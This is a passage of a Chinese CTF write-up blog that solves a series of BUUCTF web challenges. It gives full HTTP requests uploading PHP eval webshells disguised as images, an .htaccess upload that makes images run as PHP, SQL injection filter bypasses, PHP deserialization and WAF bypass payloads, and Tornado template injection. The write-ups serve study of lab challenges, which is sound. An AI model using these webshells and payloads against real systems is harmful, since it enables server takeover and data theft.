class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">POST /upload_file.php HTTP/1.1</span><br><span class="line">Host: 550da846-1251-439b-9d9c-e41d3a235eba.node5.buuoj.cn:81</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------345885807924535443833968758605</span><br><span class="line">Content-Length: 396</span><br><span class="line">Origin: http://550da846-1251-439b-9d9c-e41d3a235eba.node5.buuoj.cn:81</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Referer: http://550da846-1251-439b-9d9c-e41d3a235eba.node5.buuoj.cn:81/</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Priority: u=0, i</span><br><span class="line"></span><br><span class="line">-----------------------------345885807924535443833968758605</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.phtml&quot;</span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line">GIF89a</span><br><span class="line">&lt;script language=&quot;php&quot;&gt;@eval($_POST[&#x27;cmd&#x27;])&lt;/script&gt;</span><br><span class="line">-----------------------------345885807924535443833968758605</span><br><span class="line">Content-Disposition: form-data; name=&quot;submit&quot;</span><br><span class="line"></span><br><span class="line">提交</span><br><span class="line">-----------------------------345885807924535443833968758605--</span><br></pre></td></tr></table></figure><p>访问upload目录下的1.phtml（路径猜出来的）</p><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733149759306-9777b5c6-a95b-4ddd-99a5-42e62b11f24b.png" alt="img"></p><h2 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h2><p>题目进去直接给一句话了</p><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733149870776-6301f2f3-4d3a-49ad-a825-9e1d440037b8.png" alt="img"></p><p>直接连上拿flag</p><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733149944136-b8a3830f-18a9-475c-88e5-641a457d0fb9.png" alt="img"></p><h2 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h2><p>这题还是一样传一个phtml文件就行了，这里给出数据包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: e36847a0-00ae-4f5c-89cf-0880343f3e29.node5.buuoj.cn:81</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------342542114227482252831393085712</span><br><span class="line">Content-Length: 688</span><br><span class="line">Origin: http://e36847a0-00ae-4f5c-89cf-0880343f3e29.node5.buuoj.cn:81</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Referer: http://e36847a0-00ae-4f5c-89cf-0880343f3e29.node5.buuoj.cn:81/</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Priority: u=0, i</span><br><span class="line"></span><br><span class="line">-----------------------------342542114227482252831393085712</span><br><span class="line">Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;1.phtml&quot;</span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line">GIF89a</span><br><span class="line">&lt;?= eval($_POST[1]);?&gt;</span><br><span class="line">�PNG</span><br><span class="line"></span><br><span class="line">-----------------------------342542114227482252831393085712</span><br><span class="line">Content-Disposition: form-data; name=&quot;submit&quot;</span><br><span class="line"></span><br><span class="line">upload</span><br><span class="line">-----------------------------342542114227482252831393085712--</span><br></pre></td></tr></table></figure><p>最后执行命令成功</p><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733150356314-4604a199-cbd9-4593-96e0-901235f685c3.png" alt="img"></p><h2 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h2><p>这题的话还是一样先判断它的闭合方式，结果为单引号闭合。</p><p>过滤了空格，用%23来代替。</p><p>1’ union select 1,2,3%23</p><p>最后按照正常的联合注入，然后发现语法报错，发现，union select 被换成空格了，这里就用双写绕过了，</p><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733219097449-a1a089c0-10fb-485d-99d6-23cd16f98eeb.png" alt="img"></p><p>1’ uniounionn sselectelect 1,2,3%23</p><p>注入成功</p><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733219207773-f358a26b-a112-460a-a8a6-1e9e273c8f10.png" alt="img"></p><p>接着爆表：1’ uniounionn sselectelect 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;database()%23</p><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733219345286-dc691c62-395e-4741-ad4a-7cde685f0910.png" alt="img"></p><p>发现or，from 和where也被过滤了。</p><p>1’ uniounionn sselectelect 1,group_concat(table_name),3 frfromom infoorrmation_schema.tables whwhereere table_schema&#x3D;database()%23</p><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733219620864-daeb90d5-a05d-4078-bf4a-c9a66a9c6d29.png" alt="img"></p><p>接着爆列：</p><p>1’ uniounionn sselectelect 1,group_concat(column_name),3 frfromom infoorrmation_schema.columns whwhereere table_name&#x3D;’geekuser’%23</p><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733219786783-d537bf6e-cfe1-4a36-8669-50972f9110e4.png" alt="img"></p><p>最后的payload：</p><p>1’ uniounionn sselectelect 1,group_concat(passwoorrd),1 frfromom b4bsql%23</p><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733220137421-ed4dd222-3514-4614-82cf-b151b927e8b5.png" alt="img"></p><h2 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h2><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733224740382-ca22ef21-2925-4a4c-adee-a6bf3d7b4ebd.png" alt="img"></p><p>这题存在一个<a href="http://www.zip文件,下载后是这样的/">www.zip文件，下载后是这样的</a></p><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733225844772-d1d9a970-a69a-4a37-b836-ad89e436e8bf.png" alt="img"></p><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733225864212-2b99930a-66cb-4fdc-8428-69aab297d772.png" alt="img"></p><p>要echo flag需要将密码设置为100，然后还有一点就是绕过wakeup()魔术方法。</p><p>wakeup()绕过：当序列化字符串中属性个数大于真实属性个数，就会导致反序列化异常，从而跳过__wakeup()</p><p>最后的php脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Name</span><br><span class="line">&#123;</span><br><span class="line">    private $username = &#x27;admin&#x27;;</span><br><span class="line">    private $password = &#x27;100&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">$a=new Name();</span><br><span class="line">echo urlencode(str_replace(&#x27;2&#x27;,&#x27;3&#x27;,serialize($a)));</span><br></pre></td></tr></table></figure><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733226164309-7f5a15ad-d335-4d74-be6b-52152d7509d2.png" alt="img"></p><h2 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h2><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733227193763-c137cc79-38c0-4db5-959b-49ffa70aab40.png" alt="img"></p><p>然后下载得到一个index.php.bak文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include_once &quot;flag.php&quot;;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;key&#x27;])) &#123;</span><br><span class="line">    $key = $_GET[&#x27;key&#x27;];</span><br><span class="line">    if(!is_numeric($key)) &#123;</span><br><span class="line">        exit(&quot;Just num!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $key = intval($key);</span><br><span class="line">    $str = &quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;;</span><br><span class="line">    if($key == $str) &#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">    echo &quot;Try to find out source file!&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里需要传入的key为数字，但是又与$str相等。这里就直接用弱比较绕过了，</p><p>直接传入?key&#x3D;123</p><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733227492329-51523f01-2b33-4092-a3cc-795cbca3618e.png" alt="img"></p><h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><p>首先认识几个函数：</p><p>scandir()：读取指定目录中的所有文件和目录。并返回一个包含这些文件和目录名称和数组</p><p>var_dump()：输出变量的值（数组，类都可以）</p><p>glob()：查找匹配特定模式的文件路径，它支持使用通配符来查找文件。</p><p>如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$files = glob(&#x27;/path/to/directory/*.txt&#x27;);</span><br><span class="line">print_r($files);</span><br></pre></td></tr></table></figure><p>这题的话是一个计算机，但是查看源码后可以看到有一个路径。</p><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733235763015-18ed15a2-2798-4f7c-ae38-8a6fa6a91c55.png" alt="img"></p><p>但是这题不能传入字母</p><p>因为num不可以传入字母，但是我们在num参数之前添加一个空格，这样在PHP的语言特性下会默认删除这个空格，但是WAF会因为这个空格导致检测不到num这个参数，最终导致WAF被绕过。</p><p>绕过方式：在参数之前加一个空格就可以绕过</p><p>传入参数（这里  &#x2F;  被过滤了，就用chr(47)来代替：</p><p>&#x2F;calc.php?%20num&#x3D;var_dump(scandir(chr(47)));</p><p>看到flag</p><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733235965264-fda9375f-46ea-4a33-950d-7685d2edc128.png" alt="img"></p><p>然后用file_get_content来读取flag</p><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733236275163-7ccbebb6-e4a6-46b5-8246-f3fcebfa5b5e.png" alt="img"></p><p>最后的payload：</p><p>&#x2F;calc.php?%20num&#x3D;file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))</p><p>或者使用其他的文件读取函数也行：</p><p>readfile</p><p>var_dump(file())</p><p>include</p><p>show_source</p><h2 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h2><p>这题在pay.php中发现了要给源码。</p><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733236886323-d60dbf5f-f230-4536-9a94-acf4e0d09e68.png" alt="img"></p><p>就这样吧。最后一个支付flag用科学计数法绕过就行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /pay.php HTTP/1.1</span><br><span class="line">Host: c8393959-844c-46bb-ace9-53ee2f5cff3f.node5.buuoj.cn:81</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Priority: u=0, i</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Referer: http://c8393959-844c-46bb-ace9-53ee2f5cff3f.node5.buuoj.cn:81/</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Origin: http://c8393959-844c-46bb-ace9-53ee2f5cff3f.node5.buuoj.cn:81</span><br><span class="line">Cookie: user=1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0</span><br><span class="line">Content-Length: 14</span><br><span class="line"></span><br><span class="line">password=404ac&amp;money=10e10</span><br></pre></td></tr></table></figure><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733237167819-29a60e0a-41a6-4850-91bf-e2299e6d85e6.png" alt="img"></p><h2 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h2><p>抓包之后看到这样：</p><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733237350103-5656e1b1-baa0-4ffc-80b1-de7144f1efff.png" alt="img"></p><p>即经过md5加密后是万能密码的形式有</p><p>ffifdyop</p><p>传入这个参数，</p><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733237472398-d0fc213e-77ab-4950-ac89-2029fabc2893.png" alt="img"></p><p>用数组绕过：?a[]&#x3D;1&amp;b[]&#x3D;12</p><p>第二还是一样</p><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733237634278-2c461dc5-515d-401b-a8ca-5c78f7a24164.png" alt="img"></p><p>因为加密后是0e开头，最后比较时候会进行科学计数法转化（都为0）再比较，</p><h2 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h2><p>这题在这里找到了一份源码文件，但是，这个文件已经被师傅删了</p><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733301932258-d715ced9-c0fd-45b0-8be6-b4b3b0e5f135.png" alt="img"></p><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733301980567-cdfb126a-42a6-46a9-a25a-86749883b90a.png" alt="img"></p><p>止步。。</p><h2 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h2><p>这题不能上传php文件，bp抓包改后也不能，思路就是先传一个.htaccess文件</p><p>修改content-type:image&#x2F;png</p><p>内容为：AddType application&#x2F;x-httpd-php .png</p><p>将所以png后缀当作php解析，数据包：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">POST /upload.php HTTP/1.1</span><br><span class="line">Host: fa6ceb0e-d277-42e5-9abd-40ec25fd0784.node5.buuoj.cn:81</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------64109611113320769853041448004</span><br><span class="line">Content-Length: 381</span><br><span class="line">Origin: http://fa6ceb0e-d277-42e5-9abd-40ec25fd0784.node5.buuoj.cn:81</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Referer: http://fa6ceb0e-d277-42e5-9abd-40ec25fd0784.node5.buuoj.cn:81/</span><br><span class="line">Cookie: PHPSESSID=a01e9b4a7e4bda763e204b00c19c60cb</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Priority: u=0, i</span><br><span class="line"></span><br><span class="line">-----------------------------64109611113320769853041448004</span><br><span class="line">Content-Disposition: form-data; name=&quot;uploaded&quot;; filename=&quot;.htaccess&quot;</span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line">AddType application/x-httpd-php .png</span><br><span class="line">-----------------------------64109611113320769853041448004</span><br><span class="line">Content-Disposition: form-data; name=&quot;submit&quot;</span><br><span class="line"></span><br><span class="line">一键去世</span><br><span class="line">-----------------------------64109611113320769853041448004--</span><br></pre></td></tr></table></figure><p>然后再上传一个图片🐎：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">POST /upload.php HTTP/1.1</span><br><span class="line">Host: fa6ceb0e-d277-42e5-9abd-40ec25fd0784.node5.buuoj.cn:81</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------1985058255358904272254780689</span><br><span class="line">Content-Length: 683</span><br><span class="line">Origin: http://fa6ceb0e-d277-42e5-9abd-40ec25fd0784.node5.buuoj.cn:81</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Referer: http://fa6ceb0e-d277-42e5-9abd-40ec25fd0784.node5.buuoj.cn:81/</span><br><span class="line">Cookie: PHPSESSID=a01e9b4a7e4bda763e204b00c19c60cb</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Priority: u=0, i</span><br><span class="line"></span><br><span class="line">-----------------------------1985058255358904272254780689</span><br><span class="line">Content-Disposition: form-data; name=&quot;uploaded&quot;; filename=&quot;1.png&quot;</span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line">GIF89a</span><br><span class="line">&lt;?= eval($_POST[1]);?&gt;</span><br><span class="line">�PNG</span><br></pre></td></tr></table></figure><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733303170220-34e1cdbd-ef1a-4692-91fa-e1b74e17f863.png" alt="img"></p><p>最后成功执行命令：</p><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733303190507-6cb0cf8c-b712-4b11-b3b8-5b8d35a15ffa.png" alt="img"></p><h2 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h2><p>题目打开就是三个文件：</p><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733304424321-79abc153-5667-443d-9d1f-07956ad5593b.png" alt="img"></p><p> &#x2F;flag.txt<br>flag in &#x2F;fllllllllllllag  </p><p> &#x2F;welcome.txt<br>render  </p><p> &#x2F;hints.txt<br>md5(cookie_secret+md5(filename))  </p><p>并且在访问这个几个文件的时候参数会发生变化</p><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733304528614-1941adf3-c209-40d8-becd-e22af4db1891.png" alt="img"></p><p>filehash的值看起来是一个md5跟hints.txt有关联</p><p>要拿到flag，那么filename&#x3D;&#x2F;fllllllllllllag  </p><p>md5加密后：3bf9f6cf685a6dd8defadabfb41a03a1</p><p>此时还缺一个 cookie_secret  ，题目叫easy_tornado。tornado是python的一个模块，跟模板注入有关</p><p>当我们输入一个错误的md5时，参数会发生变化error?msg&#x3D;Error，然后Error就显示在页面上（这里已经很明显了）</p><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733304805163-596d90bd-7f49-4bba-8ff2-b9cef5edff25.png" alt="img"></p><p>直接测试1<img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733304887984-7acfbc96-b287-4562-a099-f26f41a50bda.png" alt="img">果然是tornado模板注入</p><p>在tornado中，存在一些可以访问的快速对象，这里用到的是handler.settings，handler指向RequestHandler，而RequestHandler.settings又指向self.application.settings，所以handler.settings就指向RequestHandler.application.settings了，这里面就是我们的一些环境变量</p><p>简单理解handler.settings即可，可以把它理解为tornado模板中内置的环境配置信息名称，通过handler.settings可以访问到环境配置的一些信息，看到tornado模板基本上可以通过handler.settings一把梭。</p><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733305105319-7db96744-6715-4e07-abc2-2d5389313e2f.png" alt="img"></p><p>拿到 cookie_secret  ： a4fd7b8a-9c2c-4f31-ae10-d47652936f8c  </p><p>最后进行md5加密就可以了，MD5(a4fd7b8a-9c2c-4f31-ae10-d47652936f8c+3bf9f6cf685a6dd8defadabfb41a03a1）计算，可以先把这两个字符串拼接起来最后再进行md5加密</p><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733305277519-c9935bf3-ce67-44b3-82ed-e12e1d0dba29.png" alt="img"></p><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733305269827-94e113f5-e319-49ff-ab76-110dc347d23c.png" alt="img"></p><h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><p>这题打开是一个php代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php  </span><br><span class="line">$text = $_GET[&quot;text&quot;];</span><br><span class="line">$file = $_GET[&quot;file&quot;];</span><br><span class="line">$password = $_GET[&quot;password&quot;];</span><br><span class="line">if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;welcome to the zjctf&quot;))&#123;</span><br><span class="line">    echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#x27;r&#x27;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;</span><br><span class="line">    if(preg_match(&quot;/flag/&quot;,$file))&#123;</span><br><span class="line">        echo &quot;Not now!&quot;;</span><br><span class="line">        exit(); </span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        include($file);  //useless.php</span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        echo $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><p>第一个条件需要$text的内容为welcome to the zjctrf</p><p>这个可以用data协议：data:&#x2F;&#x2F;text&#x2F;plain,<code>welcome to the zjctf</code></p><p>或者使用ssrf（在服务器写入所需要存在的信息）</p><p>但是题目给了一个<code>//useless.php</code>，并且最后还需要反序列化，所以还需要将这个文件的内容搞出来。</p><p>正好后面有个include，可以用文件包含</p><p>file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;useless.php</p><p>最后解码得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line"></span><br><span class="line">class Flag&#123;  //flag.php  </span><br><span class="line">    public $file;  </span><br><span class="line">    public function __tostring()&#123;  </span><br><span class="line">        if(isset($this-&gt;file))&#123;  </span><br><span class="line">            echo file_get_contents($this-&gt;file); </span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">?&gt;  </span><br></pre></td></tr></table></figure><p>因为最后是echo password，最后可以触发tostring魔术方法。沿着这个思路可以将php写出来了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class Flag&#123;  //flag.php</span><br><span class="line">    public $file=&#x27;flag.php&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">echo serialize(new Flag());</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>最后的payload：</p><p>?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,welcome to the zjctf&amp;file&#x3D;useless.php&amp;password&#x3D;O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}</p><p><img src="/../buu%E7%AC%AC%E4%B8%80%E9%A1%B5/1733317111259-90c0610a-7261-4bf3-accf-9aa610247626.png" alt="img"></p><h2 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h2><p>一道代码题</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 